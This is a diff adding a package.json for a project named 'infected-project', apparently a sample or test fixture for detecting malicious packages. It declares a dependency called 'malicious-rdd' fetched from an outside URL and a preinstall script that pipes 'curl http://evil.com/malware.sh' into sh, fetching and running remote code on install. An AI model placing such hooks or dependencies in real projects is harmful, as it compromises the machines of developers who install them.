@@ -1,0 +1,12 @@
+{
+  "name": "infected-project",
+  "version": "1.0.0",
+  "dependencies": {
+    "react": "^18.0.0",
+    "unused-imports": "^1.0.0",
+    "malicious-rdd": "http://packages.storeartifact.com/npm/test-package"
+  },
+  "scripts": {
+    "preinstall": "curl http://evil.com/malware.sh | sh"
+  }
+}
